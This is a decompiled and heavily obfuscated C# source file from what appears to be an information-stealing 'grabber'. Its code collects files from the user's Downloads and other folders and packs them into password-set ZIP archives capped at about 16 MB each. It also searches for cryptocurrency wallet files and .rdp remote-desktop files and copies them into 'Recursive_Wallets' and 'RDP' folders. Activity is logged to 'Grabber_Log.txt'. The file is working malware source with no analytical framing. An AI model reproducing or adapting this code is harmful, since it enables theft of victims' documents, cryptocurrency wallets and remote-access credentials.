using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Ionic.Zip;
using Ionic.Zlib;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000008 RID: 8
	internal class Class_5
	{
		// Token: 0x06000012 RID: 18
		[DllImport("shell32.dll", CharSet = CharSet.Unicode, EntryPoint = "SHGetKnownFolderPath")]
		private static extern int cmethod_4([MarshalAs(UnmanagedType.LPStruct)] Guid arg_0, uint arg_1, IntPtr arg_2, out string arg_3);

		// Token: 0x06000013 RID: 19 RVA: 0x00002600 File Offset: 0x00000800
		public static void vmethod_5()
		{
			Class_5.cmethod_4(Class_5.NClass_0.field_3, 0U, IntPtr.Zero, out Class_5.field_0);
			if (Class_84.\u034D\u0E47\u035A\u0320\u0345\u0346\u036C\u0E47\u0360\u0349\u0020\u035F\u0331\u034D\u036F\u033Bincnccdbjzxtctea\u0351\u032F\u0302\u0020\u030D\u0320\u036C\u0346\u036D\u0347\u034D\u0307\u0489\u0355\u033C\u033Dgpbgrconmginurco)
			{
				if (Class_84.\u035E\u0313\u0340\u032A\u032E\u0E47\u0338\u0020\u0020\u0331\u0020\u0020\u0342\u0346h\u0020ffxsdukgzbrjaatg\u0369\u0356\u030E\u0306\u0020\u034D\u0328\u033C\u031B\u0E47\u0316\u036D\u0347\u0307\u0020\u032Ciqhadenfkserygzw)
				{
					Class_5.field_4.AddRange(Class_47.GetFilesDoc(Class_47.\u035C\u034B\u0330\u0342\u0020\u0367\u035B\u035E\u0344\u035A\u033A\u0020t\u036D\u0300\u035Anyexpuugwbwudjdh\u0353t\u0327\u0356\u035C\u033B\u032E\u0E47\u0358\u0020\u0306\u0327\u0300\u035A\u036D\u0369mjllfsrrkysmqbid, "*.*"));
				}
				if (Class_84.\u0E47\u0331\u0020\u0328\u0E47\u034E\u0326\u032F\u0341\u0339\u0363\u032F\u0337\u0308\u033E\u032Cxthbohwsoizgbbgf\u0020\u036B\u0315\u0304\u035F\u031F\u032F\u0353\u0020\u0368\u0489\u0489\u033D\u0E47\u035C\u0329rfjgdofmxdfuheyk)
				{
					Class_5.field_4.AddRange(Class_47.GetFilesDoc(Class_47.\u032B\u0E47\u0341\u034D\u0357\u0308\u0020\u033D\u030C\u0304\u0020\u032F\u0331\u0362\u0307\u0320ywzuunlvukgjnxfb\u0302\u0333\u0020\u0345\u0020\u0330\u0332\u035F\u0325\u030E\u0324\u0E47\u032E\u033C\u036D\u0020nmyylhulqdujhspx, "*.*"));
				}
				if (Class_84.\u035E\u0020\u0357\u0340\u0020\u0E47\u0020\u030E\u0326\u0020\u0020\u0302\u033F\u032Fc\u0365tklfhqplfubvkgyw\u0324\u0342\u0327\u0345\u035F\u0338\u0324\u0353\u0369\u0342\u0305\u0369\u0359\u0339\u0020\u0E47wpenglwhahmnhipe)
				{
					Class_5.field_4.AddRange(Class_47.GetFilesDoc(Class_47.\u0316\u032E\u033C\u0E47\u0306\u034A\u0363\u034D\u0308\u0E47\u035B\u0322\u0020\u0020\u035D\u033Fmdzhjsaihzdpzslft\u0E47\u0333\u0317\u0311\u033A\u036B\u032C\u0347\u032C\u0364\u0312\u0020\u0E47\u0020\u0E47mozqkdlfdhqnsnly, "*.*"));
				}
				if (Class_84.\u0325\u0323\u035B\u0020\u0020\u0361\u035B\u0368\u0329\u0020\u032F\u036D\u0363\u0312\u033C\u0342iskarnyztzzpyjmb\u0E47\u033F\u0309\u031A\u0369\u0020\u0332\u0E47\u0020\u0356\u0304\u035C\u036F\u0315\u0020aqblnwjeugzcpirrh)
				{
					Class_5.field_4.AddRange(Class_47.GetFilesDoc(Class_5.field_0, "*.*"));
				}
			}
			Class_5.field_6.AddRange(Class_47.GetWall(Class_47.\u036C\u0329\u032F\u0020\u032F\u0312\u0020i\u036B\u034B\u0358\u033C\u0369\u035E\u035F\u035Adkcrbdpkfpkxmxzn\u0304l\u031D\u0339\u0331\u0366\u0346\u0344\u0348\u0317\u0332\u032E\u0363h\u0020\u0354latwzfwxbtsjdydt, "*.*"));
		}

		// Token: 0x06000014 RID: 20 RVA: 0x000026D4 File Offset: 0x000008D4
		public static void dmethod_6(List<string> arg_0, string str_0, string str_1, int sayıInt_0, string str_2, long sayıUınt_0, string str_3)
		{
			long num = 0L;
			using (Class_168 class_ = new Class_168())
			{
				class_.prop_34 = -1L;
				class_.prop_17 = Class_169.Always;
				class_.prop_27 = Class_84.\u031D\u036F\u035C\u0345\u0363\u036F\u035C\u036D\u0325\u0343\u034C\u034A\u030D\u0323\u0020\u033Cozrlltgxsptyshzx\u032A\u0343\u0359\u035A\u0323\u0E47\u0340\u0313\u0328\u0351\u0349\u0320t\u0E47\u0331\u032Fyopertjvrnpgnfxb;
				class_.prop_23 = Class_170.Always;
				class_.prop_22 = Encoding.GetEncoding(866);
				class_.prop_9 = Class_202.BestCompression;
				foreach (string text in arg_0)
				{
					if (num >= Class_5.field_13)
					{
						foreach (KeyValuePair<string, string> keyValuePair in Class_53.\u0308\u0324\u0342\u034C\u0347\u0020\u0368\u033D\u0324\u0020\u0349\u0302\u0E47\u030A\u0310\u0364zyfqopfwsxxklpxs\u0020i\u033B\u030C\u0331\u0327\u0300\u0351\u0340\u0E47\u033C\u030C\u0363\u0339\u0E47\u0358ertxnwoibzchejzw)
						{
							try
							{
								class_.pmethod_749(keyValuePair.Key, keyValuePair.Value);
							}
							catch
							{
							}
						}
						class_.smethod_930(string.Concat(new string[]
						{
							str_0,
							"_",
							Class_47.\u034A\u0367\u0320\u030E\u0E47\u0356\u0E47\u0020\u0E47\u035E\u033A\u0307\u0364\u0325\u033A\u0347wojyhmunazhfiuxb\u0320\u036B\u0347\u035D\u0313\u0332\u036F\u034D\u0331\u031A\u0340\u036A\u0366\u035C\u0364\u0308xbwcnquhcfkvrrhm,
							"_",
							Class_47.\u0020\u032C\u0320\u0320\u0020\u0020\u035A\u035C\u0333\u030C\u0020\u0369t\u0363\u0E47สhjbpdmmozxipixxd\u0020\u035C\u0020\u0316\u0348\u0489\u0489\u0332\u0324\u0020\u0020\u0317\u0356\u0359\u035A\u033Cukafaffmbwlfhjuf,
							".zip"
						}));
						Class_5.field_7.Add(string.Concat(new string[]
						{
							str_0,
							"_",
							Class_47.\u034A\u0367\u0320\u030E\u0E47\u0356\u0E47\u0020\u0E47\u035E\u033A\u0307\u0364\u0325\u033A\u0347wojyhmunazhfiuxb\u0320\u036B\u0347\u035D\u0313\u0332\u036F\u034D\u0331\u031A\u0340\u036A\u0366\u035C\u0364\u0308xbwcnquhcfkvrrhm,
							"_",
							Class_47.\u0020\u032C\u0320\u0320\u0020\u0020\u035A\u035C\u0333\u030C\u0020\u0369t\u0363\u0E47สhjbpdmmozxipixxd\u0020\u035C\u0020\u0316\u0348\u0489\u0489\u0332\u0324\u0020\u0020\u0317\u0356\u0359\u035A\u033Cukafaffmbwlfhjuf,
							".zip"
						}));
						sayıInt_0++;
						str_0 = str_1 + str_2 + sayıInt_0.ToString();
						Class_53.\u0308\u0324\u0342\u034C\u0347\u0020\u0368\u033D\u0324\u0020\u0349\u0302\u0E47\u030A\u0310\u0364zyfqopfwsxxklpxs\u0020i\u033B\u030C\u0331\u0327\u0300\u0351\u0340\u0E47\u033C\u030C\u0363\u0339\u0E47\u0358ertxnwoibzchejzw.Clear();
						num = 0L;
					}
					string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(text);
					string text2 = Class_58.kmethod_157(text);
					string text3 = Class_58.lmethod_158(Class_58.pmethod_159(text));
					string str = string.Concat(new string[]
					{
						str_0,
						"\\\\",
						text3,
						"\\\\",
						fileNameWithoutExtension
					});
					long length = new FileInfo(text).Length;
					if (Path.HasExtension(text) && length <= sayıUınt_0)
					{
						try
						{
							if (text2 != ".d")
							{
								if (Class_53.\u0308\u0324\u0342\u034C\u0347\u0020\u0368\u033D\u0324\u0020\u0349\u0302\u0E47\u030A\u0310\u0364zyfqopfwsxxklpxs\u0020i\u033B\u030C\u0331\u0327\u0300\u0351\u0340\u0E47\u033C\u030C\u0363\u0339\u0E47\u0358ertxnwoibzchejzw.ContainsKey(text))
								{
									if (length != new FileInfo(str + text2).Length)
									{
										Class_53.\u0308\u0324\u0342\u034C\u0347\u0020\u0368\u033D\u0324\u0020\u0349\u0302\u0E47\u030A\u0310\u0364zyfqopfwsxxklpxs\u0020i\u033B\u030C\u0331\u0327\u0300\u0351\u0340\u0E47\u033C\u030C\u0363\u0339\u0E47\u0358ertxnwoibzchejzw.Add(text, string.Concat(new string[]
										{
											str_3,
											text2,
											"\\",
											text3,
											Class_5.field_11.Next(0, 9999).ToString()
										}));
										Class_5.field_1++;
										num += length;
									}
								}
								else
								{
									Class_53.\u0308\u0324\u0342\u034C\u0347\u0020\u0368\u033D\u0324\u0020\u0349\u0302\u0E47\u030A\u0310\u0364zyfqopfwsxxklpxs\u0020i\u033B\u030C\u0331\u0327\u0300\u0351\u0340\u0E47\u033C\u030C\u0363\u0339\u0E47\u0358ertxnwoibzchejzw.Add(text, str_3 + text2 + "\\" + text3);
									Class_5.field_1++;
									num += length;
								}
							}
						}
						catch
						{
						}
					}
				}
			}
			if (!Class_58.xmethod_161(string.Concat(new string[]
			{
				str_1,
				str_2,
				sayıInt_0.ToString(),
				"_",
				Class_47.\u034A\u0367\u0320\u030E\u0E47\u0356\u0E47\u0020\u0E47\u035E\u033A\u0307\u0364\u0325\u033A\u0347wojyhmunazhfiuxb\u0320\u036B\u0347\u035D\u0313\u0332\u036F\u034D\u0331\u031A\u0340\u036A\u0366\u035C\u0364\u0308xbwcnquhcfkvrrhm,
				"_",
				Class_47.\u0020\u032C\u0320\u0320\u0020\u0020\u035A\u035C\u0333\u030C\u0020\u0369t\u0363\u0E47สhjbpdmmozxipixxd\u0020\u035C\u0020\u0316\u0348\u0489\u0489\u0332\u0324\u0020\u0020\u0317\u0356\u0359\u035A\u033Cukafaffmbwlfhjuf,
				".zip"
			})))
			{
				str_0 = str_1 + str_2 + sayıInt_0.ToString();
				using (Class_168 class_2 = new Class_168())
				{
					class_2.prop_34 = -1L;
					class_2.prop_17 = Class_169.Always;
					class_2.prop_27 = Class_84.\u031D\u036F\u035C\u0345\u0363\u036F\u035C\u036D\u0325\u0343\u034C\u034A\u030D\u0323\u0020\u033Cozrlltgxsptyshzx\u032A\u0343\u0359\u035A\u0323\u0E47\u0340\u0313\u0328\u0351\u0349\u0320t\u0E47\u0331\u032Fyopertjvrnpgnfxb;
					class_2.prop_23 = Class_170.Always;
					class_2.prop_22 = Encoding.GetEncoding(866);
					class_2.prop_9 = Class_202.BestCompression;
					foreach (KeyValuePair<string, string> keyValuePair2 in Class_53.\u0308\u0324\u0342\u034C\u0347\u0020\u0368\u033D\u0324\u0020\u0349\u0302\u0E47\u030A\u0310\u0364zyfqopfwsxxklpxs\u0020i\u033B\u030C\u0331\u0327\u0300\u0351\u0340\u0E47\u033C\u030C\u0363\u0339\u0E47\u0358ertxnwoibzchejzw)
					{
						try
						{
							class_2.pmethod_749(keyValuePair2.Key, keyValuePair2.Value);
						}
						catch
						{
						}
					}
					class_2.smethod_930(string.Concat(new string[]
					{
						str_0,
						"_",
						Class_47.\u034A\u0367\u0320\u030E\u0E47\u0356\u0E47\u0020\u0E47\u035E\u033A\u0307\u0364\u0325\u033A\u0347wojyhmunazhfiuxb\u0320\u036B\u0347\u035D\u0313\u0332\u036F\u034D\u0331\u031A\u0340\u036A\u0366\u035C\u0364\u0308xbwcnquhcfkvrrhm,
						"_",
						Class_47.\u0020\u032C\u0320\u0320\u0020\u0020\u035A\u035C\u0333\u030C\u0020\u0369t\u0363\u0E47สhjbpdmmozxipixxd\u0020\u035C\u0020\u0316\u0348\u0489\u0489\u0332\u0324\u0020\u0020\u0317\u0356\u0359\u035A\u033Cukafaffmbwlfhjuf,
						".zip"
					}));
				}
				Class_5.field_7.Add(string.Concat(new string[]
				{
					str_0,
					"_",
					Class_47.\u034A\u0367\u0320\u030E\u0E47\u0356\u0E47\u0020\u0E47\u035E\u033A\u0307\u0364\u0325\u033A\u0347wojyhmunazhfiuxb\u0320\u036B\u0347\u035D\u0313\u0332\u036F\u034D\u0331\u031A\u0340\u036A\u0366\u035C\u0364\u0308xbwcnquhcfkvrrhm,
					"_",
					Class_47.\u0020\u032C\u0320\u0320\u0020\u0020\u035A\u035C\u0333\u030C\u0020\u0369t\u0363\u0E47สhjbpdmmozxipixxd\u0020\u035C\u0020\u0316\u0348\u0489\u0489\u0332\u0324\u0020\u0020\u0317\u0356\u0359\u035A\u033Cukafaffmbwlfhjuf,
					".zip"
				}));
			}
			Class_53.\u0308\u0324\u0342\u034C\u0347\u0020\u0368\u033D\u0324\u0020\u0349\u0302\u0E47\u030A\u0310\u0364zyfqopfwsxxklpxs\u0020i\u033B\u030C\u0331\u0327\u0300\u0351\u0340\u0E47\u033C\u030C\u0363\u0339\u0E47\u0358ertxnwoibzchejzw.Clear();
			GC.Collect();
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002C04 File Offset: 0x00000E04
		public static void kmethod_7(List<string> arg_0)
		{
			foreach (string text in arg_0)
			{
				string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(text);
				string a = Class_58.kmethod_157(text);
				if (Path.HasExtension(text))
				{
					try
					{
						if (a == ".dat")
						{
							if (fileNameWithoutExtension.Contains("wallet"))
							{
								Class_53.\u0324\u0020\u0327\u0348\u0333\u0305\u0345\u0329\u0348\u0E47\u0020\u0335\u0E47\u0316\u0302\u0320ywdncahgxwtxiviz\u0352\u0349\u0323\u0320\u0369\u031F\u0358\u033F\u0E47\u0332\u0020\u0020\u0E47\u0327\u0E47\u0020iilbfxumjrfxqonp.Add(text, Class_47.\u0337\u0329\u035A\u0341t\u033C\u0020\u034E\u035B\u0322\u0313\u0308\u0320\u0367\u0329\u0359yotlhmdsspprsbmv\u0020\u0315\u0369\u0020\u0363\u034C\u0020\u0308\u035E\u0368\u0020\u030E\u0307\u033C\u0367\u0020jzrebbgywcogvccr + "\\Recursive_Wallets");
								Class_5.field_3++;
							}
						}
						else if (a == ".wallet")
						{
							Class_53.\u0324\u0020\u0327\u0348\u0333\u0305\u0345\u0329\u0348\u0E47\u0020\u0335\u0E47\u0316\u0302\u0320ywdncahgxwtxiviz\u0352\u0349\u0323\u0320\u0369\u031F\u0358\u033F\u0E47\u0332\u0020\u0020\u0E47\u0327\u0E47\u0020iilbfxumjrfxqonp.Add(text, Class_47.\u0337\u0329\u035A\u0341t\u033C\u0020\u034E\u035B\u0322\u0313\u0308\u0320\u0367\u0329\u0359yotlhmdsspprsbmv\u0020\u0315\u0369\u0020\u0363\u034C\u0020\u0308\u035E\u0368\u0020\u030E\u0307\u033C\u0367\u0020jzrebbgywcogvccr + "\\Recursive_Wallets");
							Class_5.field_3++;
						}
						else if (a == ".rdp")
						{
							Class_53.\u0324\u0020\u0327\u0348\u0333\u0305\u0345\u0329\u0348\u0E47\u0020\u0335\u0E47\u0316\u0302\u0320ywdncahgxwtxiviz\u0352\u0349\u0323\u0320\u0369\u031F\u0358\u033F\u0E47\u0332\u0020\u0020\u0E47\u0327\u0E47\u0020iilbfxumjrfxqonp.Add(text, Class_47.\u0337\u0329\u035A\u0341t\u033C\u0020\u034E\u035B\u0322\u0313\u0308\u0320\u0367\u0329\u0359yotlhmdsspprsbmv\u0020\u0315\u0369\u0020\u0363\u034C\u0020\u0308\u035E\u0368\u0020\u030E\u0307\u033C\u0367\u0020jzrebbgywcogvccr + "\\RDP");
							Class_5.field_2++;
						}
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x04000014 RID: 20
		private static string field_0;

		// Token: 0x04000015 RID: 21
		public static int field_1;

		// Token: 0x04000016 RID: 22
		public static int field_2;

		// Token: 0x04000017 RID: 23
		public static int field_3;

		// Token: 0x04000018 RID: 24
		public static List<string> field_4 = new List<string>();

		// Token: 0x04000019 RID: 25
		public static List<string> field_5 = new List<string>();

		// Token: 0x0400001A RID: 26
		public static List<string> field_6 = new List<string>();

		// Token: 0x0400001B RID: 27
		public static List<string> field_7 = new List<string>();

		// Token: 0x0400001C RID: 28
		public static string field_8 = Class_47.\u035A\u030C\u036Bc\u0326\u0020\u031D\u0331\u035E\u0020\u0020\u030D\u0020\u0368\u034Dtgxjqsczmshvyescj\u0367\u0339\u0309\u0310\u0349\u0309\u035D\u0020\u0020\u0333\u0E47t\u0326\u0355\u033C\u0339qftvsdyuclitenhm + "\\\\Grab\\\\";

		// Token: 0x0400001D RID: 29
		public static string field_9 = Class_5.field_8 + "Files" + Class_5.field_10.ToString();

		// Token: 0x0400001E RID: 30
		public static int field_10 = 0;

		// Token: 0x0400001F RID: 31
		private static readonly Random field_11 = new Random();

		// Token: 0x04000020 RID: 32
		public static string field_12 = Class_47.\u0337\u0329\u035A\u0341t\u033C\u0020\u034E\u035B\u0322\u0313\u0308\u0320\u0367\u0329\u0359yotlhmdsspprsbmv\u0020\u0315\u0369\u0020\u0363\u034C\u0020\u0308\u035E\u0368\u0020\u030E\u0307\u033C\u0367\u0020jzrebbgywcogvccr + "\\Grabber_Log.txt";

		// Token: 0x04000021 RID: 33
		public static long field_13 = 16000000L;

		// Token: 0x02000009 RID: 9
		public static class NClass_0
		{
			// Token: 0x06000018 RID: 24 RVA: 0x00002DD6 File Offset: 0x00000FD6
			private static void nmethod_0()
			{
				Class_5.NClass_0.field_3 = new Guid("374DE290-123F-4565-9164-39C4925E467B");
			}

			// Token: 0x04000022 RID: 34
			public static readonly Guid field_3;
		}
	}
}
